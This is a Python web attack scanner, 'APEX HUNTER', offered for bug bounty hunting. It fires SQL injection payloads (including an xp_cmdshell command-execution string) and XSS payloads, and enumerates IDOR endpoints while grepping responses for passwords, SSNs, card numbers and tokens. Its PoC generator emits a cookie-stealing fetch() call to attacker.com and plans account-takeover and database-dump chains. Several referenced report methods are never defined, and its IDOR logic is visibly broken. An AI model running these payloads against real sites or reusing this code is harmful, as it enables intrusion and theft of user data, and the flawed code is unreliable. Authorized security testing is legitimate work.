#!/usr/bin/env python3
"""
APEX HUNTER - Deep Analysis Engine
Advanced vulnerability verification, evidence collection, and PoC generation
"""

import os
import sys
import json
import time
import requests
import subprocess
import threading
from datetime import datetime
from pathlib import Path
import base64
import hashlib
import sqlite3
from urllib.parse import urljoin, urlparse
import re

class DeepHunter:
    """Advanced vulnerability verification and exploitation"""
    
    def __init__(self, target):
        self.target = target
        self.findings = []
        self.verified_vulns = []
        self.evidence = {}
        self.reports = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
    def deep_sql_injection_test(self, url_base):
        """Advanced SQL injection testing with verification"""
        print("🔍 Deep SQL Injection Analysis...")
        
        sql_vulns = []
        
        # Advanced SQL injection payloads
        advanced_payloads = [
            # Error-based detection
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) AND '1'='1",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(CONCAT(USER(),0x7e,DATABASE()) AS CHAR),0x7e)) FROM DUAL),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
            
            # Time-based blind
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a) AND '1'='1",
            
            # Union-based
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "1' UNION SELECT @@version,NULL,NULL,NULL--",
            
            # Boolean-based blind
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            
            # PostgreSQL specific
            "1'; SELECT pg_sleep(5)--",
            "1' AND (SELECT 1 FROM pg_sleep(5))::text='1",
            
            # Oracle specific
            "1' AND (SELECT COUNT(*) FROM ALL_USERS)>0--",
            "1' AND (SELECT 1 FROM DUAL WHERE 1=1)=1--",
            
            # MSSQL specific
            "1'; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "1' AND (SELECT @@version)>0--"
        ]
        
        # Common injection points
        injection_points = [
            '?id=', '?user=', '?page=', '?cat=', '?action=', '?cmd=', '?search=',
            '?q=', '?query=', '?keyword=', '?lang=', '?item=', '?menu=', '?topic=',
            '?function=', '?mode=', '?view=', '?content=', '?document=', '?folder=',
            '?root=', '?path=', '?navigation=', '?nav=', '?pagename=', '?filesrc=',
            '?table=', '?field=', '?order=', '?sort=', '?filter=', '?column='
        ]
        
        for point in injection_points:
            for payload in advanced_payloads:
                try:
                    test_url = f"{url_base}{point}{payload}"
                    
                    # Time the request for time-based detection
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    end_time = time.time()
                    response_time = end_time - start_time
                    
                    # Error-based detection
                    error_patterns = [
                        r'mysql_fetch_array\(\)',
                        r'ORA-\d{5}',
                        r'Microsoft.*ODBC.*SQL Server',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*mysql_.*',
                        r'valid MySQL result',
                        r'MySqlClient\.',
                        r'com\.mysql\.jdbc',
                        r'Zend_Db_(Adapter|Statement)',
                        r'Pdo[./_\\]Mysql',
                        r'MySqlException',
                        r'SQLSTATE\[\d+\]',
                        r'SQLException',
                        r'sqlite3.OperationalError',
                        r'SQLite/JDBCDriver',
                        r'SQLiteException'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = self.verify_sql_injection(test_url, payload, 'error_based', response.text[:500])
                            if vuln:
                                sql_vulns.append(vuln)
                                break
                    
                    # Time-based detection
                    if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                        if response_time > 4:  # 5 second delay minus tolerance
                            vuln = self.verify_sql_injection(test_url, payload, 'time_based', f'Response time: {response_time:.2f}s')
                            if vuln:
                                sql_vulns.append(vuln)
                    
                    # Union-based detection
                    if 'UNION' in payload.upper():
                        if response.status_code == 200 and len(response.text) > 1000:
                            # Look for version strings or database info
                            version_patterns = [
                                r'\d+\.\d+\.\d+',
                                r'MySQL',
                                r'PostgreSQL',
                                r'Microsoft SQL Server',
                                r'Oracle Database'
                            ]
                            for pattern in version_patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    vuln = self.verify_sql_injection(test_url, payload, 'union_based', response.text[:500])
                                    if vuln:
                                        sql_vulns.append(vuln)
                                    break
                    
                except Exception as e:
                    continue
        
        return sql_vulns
    
    def verify_sql_injection(self, url, payload, vuln_type, evidence):
        """Verify SQL injection with additional tests"""
        print(f"🔬 Verifying SQL injection: {vuln_type}")
        
        # Additional verification payloads
        verification_tests = {
            'error_based': [
                "1' AND (SELECT 1)=1--",
                "1' AND (SELECT 1)=2--"
            ],
            'time_based': [
                "1' AND SLEEP(3)--",
                "1' AND SLEEP(0)--"
            ],
            'union_based': [
                "1' UNION SELECT 1,2,3--",
                "1' UNION SELECT NULL,NULL,NULL--"
            ]
        }
        
        verification_count = 0
        total_tests = len(verification_tests.get(vuln_type, []))
        
        for verify_payload in verification_tests.get(vuln_type, []):
            try:
                verify_url = url.replace(payload, verify_payload)
                start_time = time.time()
                response = self.session.get(verify_url, timeout=10)
                end_time = time.time()
                
                if vuln_type == 'time_based':
                    if 'SLEEP(3)' in verify_payload and (end_time - start_time) > 2.5:
                        verification_count += 1
                    elif 'SLEEP(0)' in verify_payload and (end_time - start_time) < 1:
                        verification_count += 1
                elif vuln_type == 'error_based':
                    if response.status_code != 500 and 'error' not in response.text.lower():
                        verification_count += 1
                elif vuln_type == 'union_based':
                    if response.status_code == 200:
                        verification_count += 1
                        
            except:
                continue
        
        # Require at least 50% verification success
        if verification_count >= (total_tests * 0.5):
            vuln_data = {
                'type': 'sql_injection',
                'subtype': vuln_type,
                'url': url,
                'payload': payload,
                'evidence': evidence,
                'verification_score': verification_count / total_tests if total_tests > 0 else 0,
                'severity': 'critical',
                'verified': True,
                'timestamp': datetime.now().isoformat(),
                'poc': self.generate_sql_poc(url, payload, vuln_type)
            }
            
            # Generate evidence
            self.collect_sql_evidence(vuln_data)
            return vuln_data
        
        return None
    
    def generate_sql_poc(self, url, payload, vuln_type):
        """Generate SQL injection proof of concept"""
        poc_steps = []
        
        if vuln_type == 'error_based':
            poc_steps = [
                f"1. Navigate to: {url}",
                f"2. Inject payload: {payload}",
                "3. Observe database error messages in response",
                "4. Extract database version and structure information",
                "5. Escalate to data extraction using error-based techniques"
            ]
        elif vuln_type == 'time_based':
            poc_steps = [
                f"1. Navigate to: {url}",
                f"2. Inject time delay payload: {payload}",
                "3. Observe response delay (5+ seconds)",
                "4. Confirm with control payload (no delay)",
                "5. Extract data using time-based blind techniques"
            ]
        elif vuln_type == 'union_based':
            poc_steps = [
                f"1. Navigate to: {url}",
                f"2. Inject UNION payload: {payload}",
                "3. Observe additional data in response",
                "4. Determine number of columns",
                "5. Extract sensitive data using UNION SELECT"
            ]
        
        return {
            'steps': poc_steps,
            'impact': 'Complete database compromise, data extraction, potential RCE',
            'remediation': 'Use parameterized queries, input validation, WAF',
            'cvss_score': 9.8,
            'cwe': 'CWE-89: SQL Injection'
        }
    
    def collect_sql_evidence(self, vuln_data):
        """Collect comprehensive evidence for SQL injection"""
        evidence_id = hashlib.md5(f"{vuln_data['url']}{vuln_data['payload']}".encode()).hexdigest()[:8]
        
        evidence = {
            'vulnerability_id': evidence_id,
            'type': 'sql_injection',
            'timestamp': datetime.now().isoformat(),
            'request_details': {
                'url': vuln_data['url'],
                'method': 'GET',
                'payload': vuln_data['payload'],
                'headers': dict(self.session.headers)
            },
            'response_details': {
                'evidence': vuln_data['evidence'],
                'verification_score': vuln_data['verification_score']
            },
            'impact_assessment': {
                'confidentiality': 'HIGH',
                'integrity': 'HIGH', 
                'availability': 'MEDIUM',
                'business_impact': 'Data breach, compliance violations, reputation damage'
            },
            'exploitation_complexity': 'LOW',
            'poc_video': f"evidence/sql_injection_{evidence_id}.mp4",
            'screenshots': [f"evidence/sql_injection_{evidence_id}_1.png"],
            'report_template': self.generate_sql_report_template(vuln_data)
        }
        
        self.evidence[evidence_id] = evidence
        return evidence_id
    
    def deep_xss_analysis(self, url_base):
        """Advanced XSS testing with context analysis"""
        print("🔍 Deep XSS Analysis...")
        
        xss_vulns = []
        
        # Advanced XSS payloads for different contexts
        xss_payloads = {
            'html_context': [
                '<script>alert("XSS-HTML-CONTEXT")</script>',
                '<img src=x onerror=alert("XSS-IMG-ONERROR")>',
                '<svg onload=alert("XSS-SVG-ONLOAD")>',
                '<iframe src="javascript:alert(\'XSS-IFRAME\')"></iframe>',
                '<body onload=alert("XSS-BODY-ONLOAD")>',
                '<div onclick=alert("XSS-DIV-ONCLICK")>Click</div>'
            ],
            'attribute_context': [
                '" onmouseover="alert(\'XSS-ATTR\')" "',
                '\' onmouseover=\'alert("XSS-ATTR-SINGLE")\' \'',
                '"><script>alert("XSS-ATTR-BREAK")</script>',
                '\';alert("XSS-ATTR-JS");\'',
                'javascript:alert("XSS-ATTR-JS-PROTOCOL")'
            ],
            'javascript_context': [
                '\';alert("XSS-JS-CONTEXT");//',
                '</script><script>alert("XSS-JS-BREAK")</script>',
                '\\";alert("XSS-JS-ESCAPE");//',
                '${alert("XSS-TEMPLATE-LITERAL")}',
                '`+alert("XSS-TEMPLATE")+`'
            ],
            'css_context': [
                '</style><script>alert("XSS-CSS-BREAK")</script>',
                'expression(alert("XSS-CSS-EXPRESSION"))',
                'url("javascript:alert(\'XSS-CSS-URL\')")',
                '/**/alert("XSS-CSS-COMMENT")'
            ]
        }
        
        # XSS injection points
        xss_points = [
            '?q=', '?search=', '?query=', '?keyword=', '?term=', '?name=',
            '?comment=', '?message=', '?text=', '?content=', '?data=', '?input=',
            '?value=', '?field=', '?param=', '?var=', '?arg=', '?title=',
            '?description=', '?subject=', '?body=', '?email=', '?user='
        ]
        
        for point in xss_points:
            for context, payloads in xss_payloads.items():
                for payload in payloads:
                    try:
                        test_url = f"{url_base}{point}{payload}"
                        response = self.session.get(test_url, timeout=10)
                        
                        # Check if payload is reflected
                        if payload in response.text:
                            # Analyze context
                            context_analysis = self.analyze_xss_context(response.text, payload)
                            
                            if context_analysis['exploitable']:
                                vuln = self.verify_xss(test_url, payload, context_analysis)
                                if vuln:
                                    xss_vulns.append(vuln)
                    
                    except Exception as e:
                        continue
        
        return xss_vulns
    
    def analyze_xss_context(self, html_content, payload):
        """Analyze XSS context for exploitability"""
        context_info = {
            'exploitable': False,
            'context_type': 'unknown',
            'filters_detected': [],
            'encoding_detected': [],
            'waf_detected': False
        }
        
        # Find payload in HTML
        payload_index = html_content.find(payload)
        if payload_index == -1:
            return context_info
        
        # Analyze surrounding context
        start = max(0, payload_index - 100)
        end = min(len(html_content), payload_index + len(payload) + 100)
        context = html_content[start:end]
        
        # Determine context type
        if '<script' in context and '</script>' in context:
            context_info['context_type'] = 'javascript'
        elif 'style=' in context or '<style' in context:
            context_info['context_type'] = 'css'
        elif any(attr in context for attr in ['href=', 'src=', 'action=', 'onclick=']):
            context_info['context_type'] = 'attribute'
        else:
            context_info['context_type'] = 'html'
        
        # Check for filters/encoding
        if '&lt;' in context or '&gt;' in context:
            context_info['encoding_detected'].append('html_entities')
        if '\\x' in context or '\\u' in context:
            context_info['encoding_detected'].append('unicode_escape')
        if payload.replace('<', '').replace('>', '') in context:
            context_info['filters_detected'].append('tag_removal')
        
        # Check for WAF
        waf_indicators = ['blocked', 'forbidden', 'security', 'firewall', 'protection']
        if any(indicator in html_content.lower() for indicator in waf_indicators):
            context_info['waf_detected'] = True
        
        # Determine exploitability
        if (context_info['context_type'] in ['html', 'attribute'] and 
            not context_info['encoding_detected'] and 
            not context_info['waf_detected']):
            context_info['exploitable'] = True
        
        return context_info
    
    def verify_xss(self, url, payload, context_analysis):
        """Verify XSS vulnerability"""
        print(f"🔬 Verifying XSS: {context_analysis['context_type']} context")
        
        # Generate verification payloads based on context
        verification_payloads = []
        
        if context_analysis['context_type'] == 'html':
            verification_payloads = [
                '<script>document.title="XSS-VERIFIED"</script>',
                '<img src=x onerror=document.title="XSS-IMG-VERIFIED">',
                '<svg onload=document.title="XSS-SVG-VERIFIED">'
            ]
        elif context_analysis['context_type'] == 'attribute':
            verification_payloads = [
                '" onmouseover="document.title=\'XSS-ATTR-VERIFIED\'" "',
                '\' onload=\'document.title="XSS-ATTR-VERIFIED"\' \''
            ]
        elif context_analysis['context_type'] == 'javascript':
            verification_payloads = [
                '\';document.title="XSS-JS-VERIFIED";//',
                '\\";document.title="XSS-JS-VERIFIED";//'
            ]
        
        verified = False
        for verify_payload in verification_payloads:
            try:
                verify_url = url.replace(payload, verify_payload)
                response = self.session.get(verify_url, timeout=10)
                
                if verify_payload in response.text:
                    verified = True
                    break
            except:
                continue
        
        if verified:
            vuln_data = {
                'type': 'xss',
                'subtype': context_analysis['context_type'],
                'url': url,
                'payload': payload,
                'context_analysis': context_analysis,
                'severity': 'high' if context_analysis['exploitable'] else 'medium',
                'verified': True,
                'timestamp': datetime.now().isoformat(),
                'poc': self.generate_xss_poc(url, payload, context_analysis)
            }
            
            # Generate evidence
            self.collect_xss_evidence(vuln_data)
            return vuln_data
        
        return None
    
    def generate_xss_poc(self, url, payload, context_analysis):
        """Generate XSS proof of concept"""
        poc_steps = [
            f"1. Navigate to: {url}",
            f"2. Inject payload: {payload}",
            f"3. Observe payload execution in {context_analysis['context_type']} context",
            "4. Demonstrate impact (cookie theft, session hijacking, etc.)",
            "5. Create malicious payload for real-world exploitation"
        ]
        
        # Generate advanced exploitation payload
        if context_analysis['context_type'] == 'html':
            exploit_payload = '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>'
        elif context_analysis['context_type'] == 'attribute':
            exploit_payload = '" onload="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)" "'
        else:
            exploit_payload = payload
        
        return {
            'steps': poc_steps,
            'exploit_payload': exploit_payload,
            'impact': 'Session hijacking, credential theft, defacement, malware distribution',
            'remediation': 'Input validation, output encoding, CSP headers',
            'cvss_score': 7.5 if context_analysis['exploitable'] else 5.4,
            'cwe': 'CWE-79: Cross-site Scripting'
        }
    
    def collect_xss_evidence(self, vuln_data):
        """Collect comprehensive evidence for XSS"""
        evidence_id = hashlib.md5(f"{vuln_data['url']}{vuln_data['payload']}".encode()).hexdigest()[:8]
        
        evidence = {
            'vulnerability_id': evidence_id,
            'type': 'xss',
            'timestamp': datetime.now().isoformat(),
            'request_details': {
                'url': vuln_data['url'],
                'method': 'GET',
                'payload': vuln_data['payload'],
                'headers': dict(self.session.headers)
            },
            'response_analysis': {
                'context_type': vuln_data['context_analysis']['context_type'],
                'exploitable': vuln_data['context_analysis']['exploitable'],
                'filters_detected': vuln_data['context_analysis']['filters_detected'],
                'waf_detected': vuln_data['context_analysis']['waf_detected']
            },
            'impact_assessment': {
                'confidentiality': 'HIGH',
                'integrity': 'HIGH',
                'availability': 'LOW',
                'business_impact': 'User account compromise, data theft, reputation damage'
            },
            'exploitation_complexity': 'LOW',
            'poc_video': f"evidence/xss_{evidence_id}.mp4",
            'screenshots': [f"evidence/xss_{evidence_id}_1.png"],
            'report_template': self.generate_xss_report_template(vuln_data)
        }
        
        self.evidence[evidence_id] = evidence
        return evidence_id
    
    def deep_idor_analysis(self, url_base):
        """Advanced IDOR testing with parameter analysis"""
        print("🔍 Deep IDOR Analysis...")
        
        idor_vulns = []
        
        # Common IDOR patterns
        idor_patterns = [
            r'/user/(\d+)',
            r'/profile/(\d+)',
            r'/account/(\d+)',
            r'/document/(\d+)',
            r'/file/(\d+)',
            r'/order/(\d+)',
            r'/invoice/(\d+)',
            r'/report/(\d+)',
            r'/admin/user/(\d+)',
            r'/api/user/(\d+)',
            r'/api/v\d+/user/(\d+)',
            r'\?id=(\d+)',
            r'\?user_id=(\d+)',
            r'\?account_id=(\d+)',
            r'\?profile_id=(\d+)'
        ]
        
        # Test different ID ranges and patterns
        test_ids = [
            1, 2, 3, 100, 1000, 9999,  # Sequential IDs
            '00001', '00002', '00100',  # Zero-padded IDs
            'admin', 'test', 'guest',   # String IDs
            'a1b2c3', 'abc123',        # Alphanumeric IDs
            '550e8400-e29b-41d4-a716-446655440000',  # UUIDs
        ]
        
        # Discover potential IDOR endpoints
        endpoints = self.discover_idor_endpoints(url_base)
        
        for endpoint in endpoints:
            for pattern in idor_patterns:
                if re.search(pattern, endpoint):
                    for test_id in test_ids:
                        try:
                            # Replace ID in URL
                            test_url = re.sub(pattern, f'/user/{test_id}', endpoint)
                            
                            # Test access
                            response = self.session.get(test_url, timeout=10)
                            
                            if response.status_code == 200:
                                # Analyze response for sensitive data
                                sensitive_data = self.analyze_idor_response(response.text)
                                
                                if sensitive_data:
                                    vuln = self.verify_idor(test_url, test_id, sensitive_data)
                                    if vuln:
                                        idor_vulns.append(vuln)
                        
                        except Exception as e:
                            continue
        
        return idor_vulns
    
    def discover_idor_endpoints(self, url_base):
        """Discover potential IDOR endpoints"""
        endpoints = []
        
        # Common endpoint patterns
        endpoint_patterns = [
            '/user/', '/profile/', '/account/', '/admin/',
            '/api/user/', '/api/profile/', '/api/account/',
            '/dashboard/', '/settings/', '/preferences/',
            '/document/', '/file/', '/report/', '/order/'
        ]
        
        for pattern in endpoint_patterns:
            try:
                test_url = urljoin(url_base, pattern + '1')
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code in [200, 403, 401]:
                    endpoints.append(test_url)
            except:
                continue
        
        return endpoints
    
    def analyze_idor_response(self, response_text):
        """Analyze response for sensitive data patterns"""
        sensitive_patterns = [
            r'email["\']?\s*:\s*["\']([^"\']+@[^"\']+)["\']',
            r'password["\']?\s*:\s*["\']([^"\']+)["\']',
            r'ssn["\']?\s*:\s*["\'](\d{3}-\d{2}-\d{4})["\']',
            r'credit_card["\']?\s*:\s*["\'](\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4})["\']',
            r'phone["\']?\s*:\s*["\'](\+?\d{1,3}[-.\s]?\d{3,4}[-.\s]?\d{3,4}[-.\s]?\d{3,4})["\']',
            r'address["\']?\s*:\s*["\']([^"\']{10,})["\']',
            r'api_key["\']?\s*:\s*["\']([a-zA-Z0-9]{20,})["\']',
            r'token["\']?\s*:\s*["\']([a-zA-Z0-9]{20,})["\']'
        ]
        
        sensitive_data = []
        
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                sensitive_data.extend(matches)
        
        return sensitive_data
    
    def verify_idor(self, url, test_id, sensitive_data):
        """Verify IDOR vulnerability"""
        print(f"🔬 Verifying IDOR: {url}")
        
        # Test with different IDs to confirm unauthorized access
        verification_ids = [test_id + 1, test_id - 1, 'admin', 'test']
        unauthorized_access = 0
        
        for verify_id in verification_ids:
            try:
                verify_url = url.replace(str(test_id), str(verify_id))
                response = self.session.get(verify_url, timeout=10)
                
                if response.status_code == 200:
                    verify_sensitive = self.analyze_idor_response(response.text)
                    if verify_sensitive and verify_sensitive != sensitive_data:
                        unauthorized_access += 1
            except:
                continue
        
        if unauthorized_access > 0:
            vuln_data = {
                'type': 'idor',
                'url': url,
                'test_id': test_id,
                'sensitive_data': sensitive_data,
                'unauthorized_access_count': unauthorized_access,
                'severity': 'high',
                'verified': True,
                'timestamp': datetime.now().isoformat(),
                'poc': self.generate_idor_poc(url, test_id, sensitive_data)
            }
            
            # Generate evidence
            self.collect_idor_evidence(vuln_data)
            return vuln_data
        
        return None
    
    def generate_idor_poc(self, url, test_id, sensitive_data):
        """Generate IDOR proof of concept"""
        poc_steps = [
            f"1. Navigate to: {url}",
            f"2. Observe access to user ID: {test_id}",
            f"3. Modify ID parameter to access other users",
            f"4. Confirm unauthorized access to sensitive data: {sensitive_data[:3]}",
            "5. Demonstrate data extraction from multiple user accounts"
        ]
        
        return {
            'steps': poc_steps,
            'impact': 'Unauthorized access to user data, privacy violations, data breach',
            'remediation': 'Implement proper authorization checks, use UUIDs, validate user permissions',
            'cvss_score': 8.1,
            'cwe': 'CWE-639: Authorization Bypass Through User-Controlled Key'
        }
    
    def collect_idor_evidence(self, vuln_data):
        """Collect comprehensive evidence for IDOR"""
        evidence_id = hashlib.md5(f"{vuln_data['url']}{vuln_data['test_id']}".encode()).hexdigest()[:8]
        
        evidence = {
            'vulnerability_id': evidence_id,
            'type': 'idor',
            'timestamp': datetime.now().isoformat(),
            'request_details': {
                'url': vuln_data['url'],
                'method': 'GET',
                'test_id': vuln_data['test_id'],
                'headers': dict(self.session.headers)
            },
            'response_analysis': {
                'sensitive_data_found': vuln_data['sensitive_data'],
                'unauthorized_access_count': vuln_data['unauthorized_access_count']
            },
            'impact_assessment': {
                'confidentiality': 'HIGH',
                'integrity': 'LOW',
                'availability': 'LOW',
                'business_impact': 'Data privacy violations, regulatory compliance issues'
            },
            'exploitation_complexity': 'LOW',
            'poc_video': f"evidence/idor_{evidence_id}.mp4",
            'screenshots': [f"evidence/idor_{evidence_id}_1.png"],
            'report_template': self.generate_idor_report_template(vuln_data)
        }
        
        self.evidence[evidence_id] = evidence
        return evidence_id
    
    def generate_comprehensive_chains(self):
        """Generate advanced exploit chains from verified vulnerabilities"""
        print("⛓️ Generating Advanced Exploit Chains...")
        
        chains = []
        
        # SQL Injection + IDOR = Data Extraction Chain
        sql_vulns = [v for v in self.verified_vulns if v['type'] == 'sql_injection']
        idor_vulns = [v for v in self.verified_vulns if v['type'] == 'idor']
        
        if sql_vulns and idor_vulns:
            chain = {
                'name': 'SQL Injection + IDOR Data Extraction Chain',
                'description': 'Combine SQL injection with IDOR to extract comprehensive user database',
                'components': [sql_vulns[0], idor_vulns[0]],
                'attack_flow': [
                    'Step 1: Exploit SQL injection to enumerate user IDs',
                    'Step 2: Use IDOR to access individual user profiles',
                    'Step 3: Extract sensitive data from all user accounts',
                    'Step 4: Combine data for complete database dump'
                ],
                'severity': 'critical',
                'estimated_bounty': '$5,000-$15,000',
                'cvss_score': 9.8,
                'business_impact': 'Complete user database compromise',
                'evidence_collected': True,
                'poc_available': True
            }
            chains.append(chain)
        
        # XSS + IDOR = Account Takeover Chain
        xss_vulns = [v for v in self.verified_vulns if v['type'] == 'xss']
        
        if xss_vulns and idor_vulns:
            chain = {
                'name': 'XSS + IDOR Account Takeover Chain',
                'description': 'Use XSS to steal admin session, then IDOR to access all user accounts',
                'components': [xss_vulns[0], idor_vulns[0]],
                'attack_flow': [
                    'Step 1: Exploit XSS to steal admin session cookies',
                    'Step 2: Use stolen session to access admin panel',
                    'Step 3: Exploit IDOR to enumerate all user accounts',
                    'Step 4: Modify user data and escalate privileges'
                ],
                'severity': 'critical',
                'estimated_bounty': '$3,000-$10,000',
                'cvss_score': 9.3,
                'business_impact': 'Complete platform compromise',
                'evidence_collected': True,
                'poc_available': True
            }
            chains.append(chain)
        
        return chains
    
    def generate_professional_report(self, target):
        """Generate professional vulnerability assessment report"""
        print("📝 Generating Professional Report...")
        
        report = {
            'executive_summary': {
                'target': target,
                'assessment_date': datetime.now().strftime('%Y-%m-%d'),
                'total_vulnerabilities': len(self.verified_vulns),
                'critical_vulnerabilities': len([v for v in self.verified_vulns if v['severity'] == 'critical']),
                'high_vulnerabilities': len([v for v in self.verified_vulns if v['severity'] == 'high']),
                'estimated_total_bounty': sum([5000 if v['severity'] == 'critical' else 2000 if v['severity'] == 'high' else 500 for v in self.verified_vulns]),
                'risk_rating': 'CRITICAL' if any(v['severity'] == 'critical' for v in self.verified_vulns) else 'HIGH'
            },
            'methodology': {
                'reconnaissance': 'Comprehensive subdomain enumeration, technology fingerprinting',
                'vulnerability_assessment': 'Advanced payload testing with context analysis',
                'verification': 'Multi-stage verification with proof-of-concept development',
                'evidence_collection': 'Screenshots, videos, detailed technical documentation'
            },
            'findings': self.verified_vulns,
            'exploit_chains': self.generate_comprehensive_chains(),
            'evidence_index': self.evidence,
            'recommendations': {
                'immediate': [
                    'Patch all critical vulnerabilities within 24 hours',
                    'Implement input validation and output encoding',
                    'Deploy Web Application Firewall (WAF)',
                    'Conduct emergency security review'
                ],
                'short_term': [
                    'Implement comprehensive security testing in CI/CD',
                    'Conduct security code review',
                    'Implement proper authorization controls',
                    'Deploy security monitoring and alerting'
                ],
                'long_term': [
                    'Establish security development lifecycle (SDL)',
                    'Regular penetration testing program',
                    'Security awareness training for developers',
                    'Bug bounty program implementation'
                ]
            }
        }
        
        # Save report
        report_file = f"reports/apex_hunter_report_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        os.makedirs('reports', exist_ok=True)
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"📄 Report saved: {report_file}")
        return report
    
    def run_deep_analysis(self):
        """Run complete deep analysis"""
        print(f"🎯 Starting Deep Analysis: {self.target}")
        print("=" * 60)
        
        # Phase 1: SQL Injection Analysis
        sql_vulns = self.deep_sql_injection_test(f"http://{self.target}")
        self.verified_vulns.extend(sql_vulns)
        
        # Phase 2: XSS Analysis
        xss_vulns = self.deep_xss_analysis(f"http://{self.target}")
        self.verified_vulns.extend(xss_vulns)
        
        # Phase 3: IDOR Analysis
        idor_vulns = self.deep_idor_analysis(f"http://{self.target}")
        self.verified_vulns.extend(idor_vulns)
        
        # Phase 4: Generate Chains
        chains = self.generate_comprehensive_chains()
        
        # Phase 5: Generate Report
        report = self.generate_professional_report(self.target)
        
        print("\n🎉 Deep Analysis Complete!")
        print(f"✅ Verified Vulnerabilities: {len(self.verified_vulns)}")
        print(f"⛓️ Exploit Chains: {len(chains)}")
        print(f"💰 Estimated Bounty: ${report['executive_summary']['estimated_total_bounty']:,}")
        
        return {
            'vulnerabilities': self.verified_vulns,
            'chains': chains,
            'evidence': self.evidence,
            'report': report
        }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python deep_hunter.py <target>")
        print("Example: python deep_hunter.py testphp.vulnweb.com")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print("⚠️ ETHICAL TESTING ONLY")
    print("Only test targets you own or have permission to test!")
    
    if target != "testphp.vulnweb.com":
        confirm = input(f"Are you authorized to test {target}? (yes/no): ")
        if confirm.lower() != 'yes':
            print("❌ Testing cancelled")
            sys.exit(1)
    
    hunter = DeepHunter(target)
    results = hunter.run_deep_analysis()
    
    print(f"\n📊 Results saved to: reports/")
    print(f"🎯 Ready for bug bounty submission!")